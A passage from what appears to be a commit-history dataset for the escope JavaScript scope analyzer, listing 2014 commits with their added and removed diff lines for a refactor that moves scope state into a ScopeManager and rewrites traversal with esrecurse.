'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'x'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'ImportBinding'<\n>+        expect(scope.references).to.have.length 0<\n>+    it 'should import insided names#2'<c> -><\n>+        ast = harmony.parse """"""<\n>+        import {x as v} from ""mod"";<\n>+        """"""<c> sourceType: 'module'<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<c> sourceType: 'module'<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        globalScope = scopeManager.scopes[0]<\n>+        expect(globalScope.type).to.be.equal 'global'<\n>+        expect(globalScope.variables).to.have.length 0<\n>+        expect(globalScope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'module'<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.variables[0].name).to.be.equal 'v'<\n>+        expect(scope.variables[0].defs[0].type).to.be.equal 'ImportBinding'<\n>+        expect(scope.references).to.have.length 0<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>",-        if (scope.type === 'class') {<\n>-        } else if (scope.type === 'function') {<\n>-        SCOPE_FUNCTION_EXPRESSION_NAME = 1<c><\n>-        SCOPE_TDZ = 2;<\n>-            (this.type === 'global' || this.type === 'function') ? this : scopeManager.__currentScope.variableScope;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,12,32,8 Dec 2014,Update dependencies,0,0,1,4,116,"+    ""esrecurse"": ""^1.2.0""<c><\n>+    ""estraverse"": "">=1.9.0""<c><\n>","-    ""esrecurse"": ""^1.1.0""<c><\n>-    ""estraverse"": "">=1.8.0""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,11,53,8 Dec 2014,Enclose currentScope and scopes variables into ScopeManager,0,0,1,88,5266,+        esrecurse;<\n>+            (this.type === 'global' || this.type === 'function') ? this : scopeManager.__currentScope.variableScope;<\n>+        this.upper = scopeManager.__currentScope;<\n>+        if (scopeManager.__currentScope) {<\n>+            scopeManager.__currentScope.childScopes.push(this);<\n>+        scopeManager.__currentScope = this;<\n>+        scopeManager.scopes.push(this);<\n>+        scopeManager.__currentScope = this.upper;<\n>+    function ScopeManager(options) {<\n>+        this.scopes = [];<\n>+        this.__currentScope = null;<\n>+        currentScope: function () {<\n>+            return this.scopeManager.__currentScope;<\n>+        }<c><\n>+            while (this.currentScope() && node === this.currentScope().block) {<\n>+                this.currentScope().__close(this.scopeManager);<\n>+            this.visitVariableDeclaration(this.currentScope()<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>+            var letOrConstDecl<c> that = this;<\n>+            this.visitVariableDeclaration(this.currentScope()<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>+                that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+            var i<c> iz<c> that = this;<\n>+                this.currentScope().__define(node.id<c> {<\n>+                    that.currentScope().__define(pattern<c> {<\n>+                this.currentScope().__define(node.id<c> {<\n>+                this.currentScope().__define(node.id<c> {<\n>+            var that = this;<\n>+                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                        if (!that.currentScope().isStrict) {<\n>+                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>+            var decl<c> init<c> that = this;<\n>+                    that.currentScope().__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>+            var that = this;<\n>+                        if (!that.currentScope().isStrict) {<\n>+                        that.currentScope().__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>+                    that.currentScope().__referencing(node.left<c> Reference.RW<c> node.right);<\n>+            var that = this;<\n>+                that.currentScope().__define(pattern<c> {<\n>+            this.currentScope().__referencing(node);<\n>+                this.currentScope().__referencing(node.argument<c> Reference.RW<c> null);<\n>+                this.currentScope().variableScope.__detectEval();<\n>+            this.currentScope().variableScope.__detectThis();<\n>+            variableTargetScope = (node.kind === 'var') ? this.currentScope().variableScope : this.currentScope();<\n>+        var scopeManager<c> referencer<c> options;<\n>+        scopeManager = new ScopeManager(options);<\n>+        assert(scopeManager.__currentScope === null);<\n>,-        esrecurse<c><\n>-        currentScope<c><\n>-        scopes;<\n>-            (this.type === 'global' || this.type === 'function') ? this : currentScope.variableScope;<\n>-        this.upper = currentScope;<\n>-        if (currentScope) {<\n>-            currentScope.childScopes.push(this);<\n>-        currentScope = this;<\n>-        scopes.push(this);<\n>-        currentScope = this.upper;<\n>-    function ScopeManager(scopes<c> options) {<\n>-        this.scopes = scopes;<\n>-            while (currentScope && node === currentScope.block) {<\n>-                currentScope.__close(this.scopeManager);<\n>-            this.visitVariableDeclaration(currentScope<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>-            var letOrConstDecl;<\n>-            this.visitVariableDeclaration(currentScope<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>-                currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-            var i<c> iz;<\n>-                currentScope.__define(node.id<c> {<\n>-                    currentScope.__define(pattern<c> {<\n>-                currentScope.__define(node.id<c> {<\n>-                currentScope.__define(node.id<c> {<\n>-                        currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-                        if (!currentScope.isStrict) {<\n>-                        currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>-            var decl<c> init;<\n>-                    currentScope.__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>-                        if (!currentScope.isStrict) {<\n>-                        currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>-                    currentScope.__referencing(node.left<c> Reference.RW<c> node.right);<\n>-                currentScope.__define(pattern<c> {<\n>-            currentScope.__referencing(node);<\n>-                currentScope.__referencing(node.argument<c> Reference.RW<c> null);<\n>-                currentScope.variableScope.__detectEval();<\n>-            currentScope.variableScope.__detectThis();<\n>-            variableTargetScope = (node.kind === 'var') ? currentScope.variableScope : currentScope;<\n>-        var resultScopes<c> scopeManager<c> referencer<c> options;<\n>-        resultScopes = scopes = [];<\n>-        currentScope = null;<\n>-        scopeManager = new ScopeManager(resultScopes<c> options);<\n>-        assert(currentScope === null);<\n>-        scopes = null;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,11,42,8 Dec 2014,Enclose globalScope into ScopeManager,0,0,1,8,282,+            scopeManager.globalScope = this;<\n>+            scopeManager.globalScope.implicit = {<\n>+        this.globalScope = null;<\n>,-        globalScope<c><\n>-            globalScope = this;<\n>-            globalScope.implicit = {<\n>-        globalScope = null;<\n>-        globalScope = null;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Mon,11,42,8 Dec 2014,Enclose options into ScopeManager,0,0,1,30,1567,+        scopes;<\n>+    function isStrictScope(scope<c> block<c> isMethodDefinition<c> useDirective) {<\n>+        if (useDirective) {<\n>+        this.isStrict = isStrictScope(this<c> block<c> isMethodDefinition<c> scopeManager.__useDirective());<\n>+    Scope.prototype.__close = function __close(scopeManager) {<\n>+        if (!this.dynamic || scopeManager.__isOptimistic()) {<\n>+    ScopeManager.prototype.__useDirective = function () {<\n>+        return this.__options.directive;<\n>+    };<\n>+    ScopeManager.prototype.__isOptimistic = function () {<\n>+        return this.__options.optimistic;<\n>+    };<\n>+    ScopeManager.prototype.__ignoreEval = function () {<\n>+        return this.__options.ignoreEval;<\n>+    };<\n>+                currentScope.__close(this.scopeManager);<\n>+            if (!this.scopeManager.__ignoreEval() && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>+     * @param {number} [providedOptions.ecmaVersion=5]- which ECMAScript version is considered<\n>+        var resultScopes<c> scopeManager<c> referencer<c> options;<\n>,-        scopes<c><\n>-        options;<\n>-    function isStrictScope(scope<c> block<c> isMethodDefinition) {<\n>-        if (options.directive) {<\n>-        this.isStrict = isStrictScope(this<c> block<c> isMethodDefinition);<\n>-    Scope.prototype.__close = function __close() {<\n>-        if (!this.dynamic || options.optimistic) {<\n>-                currentScope.__close();<\n>-            if (!options.ignoreEval && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>-        var resultScopes<c> scopeManager<c> referencer;<\n>-        options = null;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Wed,0,15,3 Dec 2014,Rewrite with esrecurse ref #33 And cleanup Referencer logic.,0,0,5,775,37138,"+        util<c><\n>+        extend<c><\n>+        esrecurse<c><\n>+    util = require('util');<\n>+    extend = require('util-extend');<\n>+    esrecurse = require('esrecurse');<\n>+    function isStrictScope(scope<c> block<c> isMethodDefinition) {<\n>+        if (isMethodDefinition) {<\n>+            return true;<\n>+    function Scope(scopeManager<c> block<c> isMethodDefinition<c> scopeType) {<\n>+            (block.type === Syntax.ClassExpression || block.type === Syntax.ClassDeclaration) ? 'class' : 'global';<\n>+                scopeManager.__nestFunctionExpressionNameScope(block<c> isMethodDefinition);<\n>+        this.isStrict = isStrictScope(this<c> block<c> isMethodDefinition);<\n>+    ScopeManager.prototype.__nestScope = function (node<c> isMethodDefinition) {<\n>+        return new Scope(this<c> node<c> isMethodDefinition<c> SCOPE_NORMAL);<\n>+    ScopeManager.prototype.__nestTDZScope = function (node) {<\n>+        return new Scope(this<c> node<c> false<c> SCOPE_TDZ);<\n>+    ScopeManager.prototype.__nestFunctionExpressionNameScope = function (node<c> isMethodDefinition) {<\n>+        return new Scope(this<c> node<c> isMethodDefinition<c> SCOPE_FUNCTION_EXPRESSION_NAME);<\n>+    function isPattern(node) {<\n>+        var nodeType = node.type;<\n>+        return nodeType === Syntax.Identifier || nodeType === Syntax.ObjectPattern || nodeType === Syntax.ArrayPattern || nodeType === Syntax.SpreadElement;<\n>+    function Referencer(scopeManager) {<\n>+        esrecurse.Visitor.call(this<c> this);<\n>+        this.scopeManager = scopeManager;<\n>+        this.parent = null;<\n>+        this.isInnerMethodDefinition = false;<\n>+    util.inherits(Referencer<c> esrecurse.Visitor);<\n>+    extend(Referencer.prototype<c> {<\n>+        close: function (node) {<\n>+            while (currentScope && node === currentScope.block) {<\n>+                currentScope.__close();<\n>+            }<\n>+        }<c><\n>+        pushInnerMethodDefinition: function (isInnerMethodDefinition) {<\n>+            var previous = this.isInnerMethodDefinition;<\n>+            this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>+            return previous;<\n>+        }<c><\n>+        popInnerMethodDefinition: function (isInnerMethodDefinition) {<\n>+            this.isInnerMethodDefinition = isInnerMethodDefinition;<\n>+        }<c><\n>+        materializeTDZScope: function (node<c> iterationNode) {<\n>+            // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation<\n>+            // TDZ scope hides the declaration's names.<\n>+            this.scopeManager.__nestTDZScope(node<c> iterationNode);<\n>+            this.visitVariableDeclaration(currentScope<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>+        }<c><\n>+        materializeIterationScope: function (node) {<\n>+            // Generate iteration scope for upper ForIn/ForOf Statements.<\n>+            // parent node for __nestScope is only necessary to<\n>+            // distinguish MethodDefinition.<\n>+            var letOrConstDecl;<\n>+            this.scopeManager.__nestScope(node<c> false);<\n>+            letOrConstDecl = node.left;<\n>+            this.visitVariableDeclaration(currentScope<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>+            this.visitPattern(letOrConstDecl.declarations[0].id<c> function (pattern) {<\n>+                currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+            });<\n>+        }<c><\n>+        visitPattern: function (node<c> callback) {<\n>+            traverseIdentifierInPattern(node<c> callback);<\n>+        }<c><\n>+        visitFunction: function (node) {<\n>+            var i<c> iz;<\n>+            // FunctionDeclaration name is defined in upper scope<\n>+            // NOTE: Not referring variableScope. It is intended.<\n>+            // Since<\n>+            //  in ES5<c> FunctionDeclaration should be in FunctionBody.<\n>+            //  in ES6<c> FunctionDeclaration should be block scoped.<\n>+            if (node.type === Syntax.FunctionDeclaration) {<\n>+                // id is defined in upper scope<\n>+                currentScope.__define(node.id<c> {<\n>+                    type: Variable.FunctionName<c><\n>+                    name: node.id<c><\n>+                    node: node<\n>+                });<\n>+            }<\n>+            // Consider this function is in the MethodDefinition.<\n>+            this.scopeManager.__nestScope(node<c> this.isInnerMethodDefinition);<\n>+            for (i = 0<c> iz = node.params.length; i < iz; ++i) {<\n>+                this.visitPattern(node.params[i]<c> function (pattern) {<\n>+                    currentScope.__define(pattern<c> {<\n>+                        type: Variable.Parameter<c><\n>+                        name: pattern<c><\n>+                        node: node<c><\n>+                        index: i<\n>+                    });<\n>+                });<\n>+            }<\n>+            // Skip BlockStatement to prevent creating BlockStatement scope.<\n>+            if (node.body.type === Syntax.BlockStatement) {<\n>+                this.visitChildren(node.body);<\n>+            } else {<\n>+                this.visit(node.body);<\n>+            }<\n>+            this.close(node);<\n>+        }<c><\n>+        visitClass: function (node) {<\n>+            if (node.type === Syntax.ClassDeclaration) {<\n>+                currentScope.__define(node.id<c> {<\n>+                    type: Variable.ClassName<c><\n>+                    name: node.id<c><\n>+                    node: node<\n>+                });<\n>+            }<\n>+            // FIXME: Maybe consider TDZ.<\n>+            this.visit(node.superClass);<\n>+            this.scopeManager.__nestScope(node);<\n>+            if (node.id) {<\n>+                currentScope.__define(node.id<c> {<\n>+                    type: Variable.ClassName<c><\n>+                    name: node.id<c><\n>+                    node: node<\n>+                });<\n>+            }<\n>+            this.visit(node.body);<\n>+            this.close(node);<\n>+        }<c><\n>+        visitProperty: function (node) {<\n>+            var previous<c> isMethodDefinition;<\n>+            if (node.computed) {<\n>+                this.visit(node.key);<\n>+            }<\n>+            isMethodDefinition = node.type === Syntax.MethodDefinition || node.method;<\n>+            if (isMethodDefinition) {<\n>+                previous = this.pushInnerMethodDefinition(true);<\n>+            }<\n>+            this.visit(node.value);<\n>+            if (isMethodDefinition) {<\n>+                this.popInnerMethodDefinition(previous);<\n>+            }<\n>+        }<c><\n>+        visitForIn: function (node) {<\n>+            if (node.left.type === Syntax.VariableDeclaration && node.left.kind !== 'var') {<\n>+                this.materializeTDZScope(node.right<c> node);<\n>+                this.visit(node.right);<\n>+                this.close(node.right);<\n>+                this.materializeIterationScope(node);<\n>+                this.visit(node.body);<\n>+                this.close(node);<\n>+            } else {<\n>+                if (node.left.type === Syntax.VariableDeclaration) {<\n>+                    this.visit(node.left);<\n>+                    this.visitPattern(node.left.declarations[0].id<c> function (pattern) {<\n>+                        currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>+                    });<\n>+                } else {<\n>+                    if (!isPattern(node.left)) {<\n>+                        this.visit(node.left);<\n>+                    this.visitPattern(node.left<c> function (pattern) {<\n>+                        var maybeImplicitGlobal = null;<\n>+                        if (!currentScope.isStrict) {<\n>+                            maybeImplicitGlobal = {<\n>+                                pattern: pattern<c><\n>+                                node: node<\n>+                            };<\n>+                        }<\n>+                        currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> true);<\n>+                    });<\n>+                }<\n>+                this.visit(node.right);<\n>+                this.visit(node.body);<\n>+            }<\n>+        }<c><\n>+        visitVariableDeclaration: function (variableTargetScope<c> type<c> node<c> index) {<\n>+            var decl<c> init;<\n>+            decl = node.declarations[index];<\n>+            init = decl.init;<\n>+            // FIXME: Don't consider initializer with complex patterns.<\n>+            // Such as<c><\n>+            // var [a<c> b<c> c = 20] = array;<\n>+            this.visitPattern(decl.id<c> function (pattern<c> toplevel) {<\n>+                variableTargetScope.__define(pattern<c> {<\n>+                    type: type<c><\n>+                    name: pattern<c><\n>+                    node: decl<c><\n>+                    index: index<c><\n>+                    kind: node.kind<c><\n>+                    parent: node<\n>+                });<\n>+                if (init) {<\n>+                    currentScope.__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>+                }<\n>+            });<\n>+        }<c><\n>+        AssignmentExpression: function (node) {<\n>+            if (isPattern(node.left)) {<\n>+                if (node.operator === '=') {<\n>+                    this.visitPattern(node.left<c> function (pattern<c> toplevel) {<\n>+                        var maybeImplicitGlobal = null;<\n>+                        if (!currentScope.isStrict) {<\n>+                            maybeImplicitGlobal = {<\n>+                                pattern: pattern<c><\n>+                                node: node<\n>+                            };<\n>+                        }<\n>+                        currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>+                    });<\n>+                } else {<\n>+                    currentScope.__referencing(node.left<c> Reference.RW<c> node.right);<\n>+                }<\n>+            } else {<\n>+                this.visit(node.left);<\n>+            }<\n>+            this.visit(node.right);<\n>+        }<c><\n>+        CatchClause: function (node) {<\n>+            this.scopeManager.__nestScope(node);<\n>+            this.visitPattern(node.param<c> function (pattern) {<\n>+                currentScope.__define(pattern<c> {<\n>+                    type: Variable.CatchClause<c><\n>+                    name: node.param<c><\n>+                    node: node<\n>+                });<\n>+            });<\n>+            this.visit(node.body);<\n>+            this.close(node);<\n>+        }<c><\n>+        Program: function (node) {<\n>+            this.scopeManager.__nestScope(node);<\n>+            this.visitChildren(node);<\n>+            this.close(node);<\n>+        }<c><\n>+        Identifier: function (node) {<\n>+            currentScope.__referencing(node);<\n>+        }<c><\n>+        UpdateExpression: function (node) {<\n>+            if (isPattern(node)) {<\n>+                currentScope.__referencing(node.argument<c> Reference.RW<c> null);<\n>+            } else {<\n>+                this.visitChildren(node);<\n>+            }<\n>+        }<c><\n>+        MemberExpression: function (node) {<\n>+            this.visit(node.object);<\n>+            if (node.computed) {<\n>+                this.visit(node.property);<\n>+            }<\n>+        }<c><\n>+        Property: function (node) {<\n>+            this.visitProperty(node);<\n>+        }<c><\n>+        MethodDefinition: function (node) {<\n>+            this.visitProperty(node);<\n>+        }<c><\n>+        BreakStatement: function () {}<c><\n>+        ContinueStatement: function () {}<c><\n>+        LabelledStatement: function () {}<c><\n>+        ForStatement: function (node) {<\n>+            // Create ForStatement declaration.<\n>+            // NOTE: In ES6<c> ForStatement dynamically generates<\n>+            // per iteration environment. However<c> escope is<\n>+            // a static analyzer<c> we only generate one scope for ForStatement.<\n>+            if (node.init && node.init.type === Syntax.VariableDeclaration && node.init.kind !== 'var') {<\n>+                this.scopeManager.__nestScope(node);<\n>+            }<\n>+            this.visitChildren(node);<\n>+            this.close(node);<\n>+        }<c><\n>+        ClassExpression: function (node) {<\n>+            this.visitClass(node);<\n>+        }<c><\n>+        ClassDeclaration: function (node) {<\n>+            this.visitClass(node);<\n>+        }<c><\n>+        CallExpression: function (node) {<\n>+            // Check this is direct call to eval<\n>+            if (!options.ignoreEval && node.callee.type === Syntax.Identifier && node.callee.name === 'eval') {<\n>+                // NOTE: This should be `variableScope`. Since direct eval call always creates Lexical environment and<\n>+                // let / const should be enclosed into it. Only VariableDeclaration affects on the caller's environment.<\n>+                currentScope.variableScope.__detectEval();<\n>+            }<\n>+            this.visitChildren(node);<\n>+        }<c><\n>+        BlockStatement: function (node) {<\n>+            if (this.scopeManager.__isES6()) {<\n>+                this.scopeManager.__nestScope(node);<\n>+            }<\n>+            this.visitChildren(node);<\n>+            this.close(node);<\n>+        }<c><\n>+        ThisExpression: function () {<\n>+            currentScope.variableScope.__detectThis();<\n>+        }<c><\n>+        WithStatement: function (node) {<\n>+            this.visit(node.object);<\n>+            // Then nest scope for WithStatement.<\n>+            this.scopeManager.__nestScope(node);<\n>+            this.visit(node.body);<\n>+            this.close(node);<\n>+        }<c><\n>+        VariableDeclaration: function (node) {<\n>+            var variableTargetScope<c> i<c> iz<c> decl;<\n>+            variableTargetScope = (node.kind === 'var') ? currentScope.variableScope : currentScope;<\n>+            for (i = 0<c> iz = node.declarations.length; i < iz; ++i) {<\n>+                decl = node.declarations[i];<\n>+                this.visitVariableDeclaration(variableTargetScope<c> Variable.Variable<c> node<c> i);<\n>+                if (decl.init) {<\n>+                    this.visit(decl.init);<\n>+                }<\n>+            }<\n>+        }<c><\n>+        FunctionDeclaration: function (node) {<\n>+            this.visitFunction(node);<\n>+        }<c><\n>+        FunctionExpression: function (node) {<\n>+            this.visitFunction(node);<\n>+        }<c><\n>+        ForOfStatement: function (node) {<\n>+            this.visitForIn(node);<\n>+        }<c><\n>+        ForInStatement: function (node) {<\n>+            this.visitForIn(node);<\n>+        }<c><\n>+        ArrowFunctionExpression: function (node) {<\n>+            this.visitFunction(node);<\n>+        }<\n>+    });<\n>+    /**<\n>+     * Main interface function. Takes an Esprima syntax tree and returns the<\n>+     * analyzed scopes.<\n>+     * @function analyze<\n>+     * @param {esprima.Tree} tree<\n>+     * @param {Object} providedOptions - Options that tailor the scope analysis<\n>+     * @param {boolean} [providedOptions.optimistic=false] - the optimistic flag<\n>+     * @param {boolean} [providedOptions.directive=false]- the directive flag<\n>+     * @param {boolean} [providedOptions.ignoreEval=false]- whether to check 'eval()' calls<\n>+     * @return {ScopeManager}<\n>+     */<\n>+    function analyze(tree<c> providedOptions) {<\n>+        var resultScopes<c> scopeManager<c> referencer;<\n>+        options = updateDeeply(defaultOptions()<c> providedOptions);<\n>+        resultScopes = scopes = [];<\n>+        currentScope = null;<\n>+        globalScope = null;<\n>+        scopeManager = new ScopeManager(resultScopes<c> options);<\n>+        referencer = new Referencer(scopeManager);<\n>+        referencer.visit(tree);<\n>+        'no-lone-blocks': 0<\n>+    ""esrecurse"": ""^1.1.0""<c><\n>+    ""estraverse"": "">=1.8.0""<c><\n>+    ""util-extend"": ""^1.0.1""<\n>+        expect(scope.block.type).to.be.equal 'ClassDeclaration'<\n>+        expect(scope.block.type).to.be.equal 'ClassExpression'<\n>+        expect(scope.block.type).to.be.equal 'ClassExpression'<\n>+        expect(scope.block.type).to.be.equal 'ClassExpression'<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'console'<\n>+        expect(scope.references[0].resolved).to.be.equal null<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[1].resolved).to.be.equal iterScope.variables[0]<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'console'<\n>+        expect(scope.references[0].resolved).to.be.equal null<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[1].resolved).to.be.equal iterScope.variables[0]<\n>+        expect(scope.references[0].identifier.name).to.be.equal 'console'<\n>+        expect(scope.references[0].resolved).to.be.null<\n>+        expect(scope.references[1].identifier.name).to.be.equal 'i'<\n>+        expect(scope.references[1].resolved).to.be.equal iterScope.variables[0]<\n>+        expect(scope.references[2].identifier.name).to.be.equal 'j'<\n>+        expect(scope.references[2].resolved).to.be.equal iterScope.variables[1]<\n>+        expect(scope.references[3].identifier.name).to.be.equal 'k'<\n>+        expect(scope.references[3].resolved).to.be.equal iterScope.variables[2]<\n>","-    function isMethodDefinition(block<c> parent) {<\n>-        // Check<\n>-        // + Class MethodDefinition<\n>-        // + Object MethodDefiniton<\n>-        // cases.<\n>-        if (block.type !== Syntax.FunctionExpression) {<\n>-            return false;<\n>-        }<\n>-        if (!parent) {<\n>-            return false;<\n>-        }<\n>-        if (parent.type === Syntax.MethodDefinition && block === parent.value) {<\n>-            return true;<\n>-        }<\n>-        if (parent.type === Syntax.Property && parent.method && block === parent.value) {<\n>-            return true;<\n>-        }<\n>-        return false;<\n>-    }<\n>-    function isStrictScope(scope<c> block<c> parent) {<\n>-        if (parent) {<\n>-            if (isMethodDefinition(block<c> parent)) {<\n>-                return true;<\n>-            }<\n>-    function Scope(scopeManager<c> block<c> parent<c> scopeType) {<\n>-            (block.type === Syntax.ClassBody) ? 'class' : 'global';<\n>-                scopeManager.__nestFunctionExpressionNameScope(block<c> parent);<\n>-        this.isStrict = isStrictScope(this<c> block<c> parent);<\n>-    ScopeManager.prototype.__nestScope = function (node<c> parent) {<\n>-        return new Scope(this<c> node<c> parent<c> SCOPE_NORMAL);<\n>-    ScopeManager.prototype.__nestTDZScope = function (node<c> iterationNode) {<\n>-        return new Scope(this<c> node<c> iterationNode<c> SCOPE_TDZ);<\n>-    ScopeManager.prototype.__nestFunctionExpressionNameScope = function (node<c> parent) {<\n>-        return new Scope(this<c> node<c> parent<c> SCOPE_FUNCTION_EXPRESSION_NAME);<\n>-    function doVariableDeclaration(variableTargetScope<c> type<c> node<c> index) {<\n>-        var decl<c> init;<\n>-        decl = node.declarations[index];<\n>-        init = decl.init;<\n>-        // FIXME: Don't consider initializer with complex patterns.<\n>-        // Such as<c><\n>-        // var [a<c> b<c> c = 20] = array;<\n>-        traverseIdentifierInPattern(decl.id<c> function (pattern<c> toplevel) {<\n>-            variableTargetScope.__define(pattern<c> {<\n>-                type: type<c><\n>-                name: pattern<c><\n>-                node: decl<c><\n>-                index: index<c><\n>-                kind: node.kind<c><\n>-                parent: node<\n>-            });<\n>-            if (init) {<\n>-                currentScope.__referencing(pattern<c> Reference.WRITE<c> init<c> null<c> !toplevel);<\n>-            }<\n>-        });<\n>-    function materializeTDZScope(scopeManager<c> node<c> iterationNode) {<\n>-        // http://people.mozilla.org/~jorendorff/es6-draft.html#sec-runtime-semantics-forin-div-ofexpressionevaluation-abstract-operation<\n>-        // TDZ scope hides the declaration's names.<\n>-        scopeManager.__nestTDZScope(node<c> iterationNode);<\n>-        doVariableDeclaration(currentScope<c> Variable.TDZ<c> iterationNode.left<c> 0);<\n>-        currentScope.__referencing(node);<\n>-    function materializeIterationScope(scopeManager<c> node) {<\n>-        // Generate iteration scope for upper ForIn/ForOf Statements.<\n>-        // parent node for __nestScope is only necessary to<\n>-        // distinguish MethodDefinition.<\n>-        var letOrConstDecl;<\n>-        scopeManager.__nestScope(node<c> null);<\n>-        letOrConstDecl = node.left;<\n>-        doVariableDeclaration(currentScope<c> Variable.Variable<c> letOrConstDecl<c> 0);<\n>-        traverseIdentifierInPattern(letOrConstDecl.declarations[0].id<c> function (pattern) {<\n>-            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> null<c> true);<\n>-        });<\n>-    }<\n>-    /**<\n>-     * Main interface function. Takes an Esprima syntax tree and returns the<\n>-     * analyzed scopes.<\n>-     * @function analyze<\n>-     * @param {esprima.Tree} tree<\n>-     * @param {Object} providedOptions - Options that tailor the scope analysis<\n>-     * @param {boolean} [providedOptions.optimistic=false] - the optimistic flag<\n>-     * @param {boolean} [providedOptions.directive=false]- the directive flag<\n>-     * @param {boolean} [providedOptions.ignoreEval=false]- whether to check 'eval()' calls<\n>-     * @return {ScopeManager}<\n>-     */<\n>-    function analyze(tree<c> providedOptions) {<\n>-        var resultScopes<c> scopeManager;<\n>-        options = updateDeeply(defaultOptions()<c> providedOptions);<\n>-        resultScopes = scopes = [];<\n>-        currentScope = null;<\n>-        globalScope = null;<\n>-        scopeManager = new ScopeManager(resultScopes<c> options);<\n>-        // attach scope and collect / resolve names<\n>-        estraverse.traverse(tree<c> {<\n>-            enter: function enter(node<c> parent) {<\n>-                var i<c> iz<c> decl<c> variableTargetScope;<\n>-                // Special path for ForIn/ForOf Statement block scopes.<\n>-                if (parent &&<\n>-                    (parent.type === Syntax.ForInStatement || parent.type === Syntax.ForOfStatement) &&<\n>-                    parent.left.type === Syntax.VariableDeclaration &&<\n>-                    parent.left.kind !== 'var') {<\n>-                    // Construct TDZ scope.<\n>-                    if (parent.right === node) {<\n>-                        materializeTDZScope(scopeManager<c> node<c> parent);<\n>-                    }<\n>-                    if (parent.body === node) {<\n>-                        materializeIterationScope(scopeManager<c> parent);<\n>-                    }<\n>-                }<\n>-                switch (this.type()) {<\n>-                case Syntax.AssignmentExpression:<\n>-                    if (node.operator === '=') {<\n>-                        traverseIdentifierInPattern(node.left<c> function (pattern<c> toplevel) {<\n>-                            var maybeImplicitGlobal = null;<\n>-                            if (!currentScope.isStrict) {<\n>-                                maybeImplicitGlobal = {<\n>-                                    pattern: pattern<c><\n>-                                    node: node<\n>-                                };<\n>-                            }<\n>-                            currentScope.__referencing(pattern<c> Reference.WRITE<c> node.right<c> maybeImplicitGlobal<c> !toplevel);<\n>-                        });<\n>-                    } else {<\n>-                        currentScope.__referencing(node.left<c> Reference.RW<c> node.right);<\n>-                    }<\n>-                    currentScope.__referencing(node.right);<\n>-                    break;<\n>-                case Syntax.ArrayExpression:<\n>-                    for (i = 0<c> iz = node.elements.length; i < iz; ++i) {<\n>-                        currentScope.__referencing(node.elements[i]);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.BlockStatement:<\n>-                    if (scopeManager.__isES6()) {<\n>-                        if (!parent ||<\n>-                                parent.type !== Syntax.FunctionExpression &&<\n>-                                parent.type !== Syntax.FunctionDeclaration &&<\n>-                                parent.type !== Syntax.ArrowFunctionExpression) {<\n>-                            scopeManager.__nestScope(node<c> parent);<\n>-                        }<\n>-                    }<\n>-                    break;<\n>-                case Syntax.BinaryExpression:<\n>-                    currentScope.__referencing(node.left);<\n>-                    currentScope.__referencing(node.right);<\n>-                    break;<\n>-                case Syntax.BreakStatement:<\n>-                    break;<\n>-                case Syntax.CallExpression:<\n>-                    currentScope.__referencing(node.callee);<\n>-                    for (i = 0<c> iz = node['arguments'].length; i < iz; ++i) {<\n>-                        currentScope.__referencing(node['arguments'][i]);<\n>-                    }<\n>-                    // 